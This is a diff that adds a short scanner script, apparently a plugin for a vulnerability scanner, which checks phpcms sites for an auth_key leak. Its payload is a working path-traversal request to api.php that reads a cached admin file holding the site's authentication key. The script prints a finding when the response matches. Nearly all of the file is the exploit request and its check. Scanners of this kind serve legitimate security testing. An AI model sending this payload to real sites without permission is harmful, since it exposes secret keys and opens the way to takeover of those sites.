@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin
+#define bug = aaaaa([
+#define info = /api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin |存在phpcms auth_key泄露
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
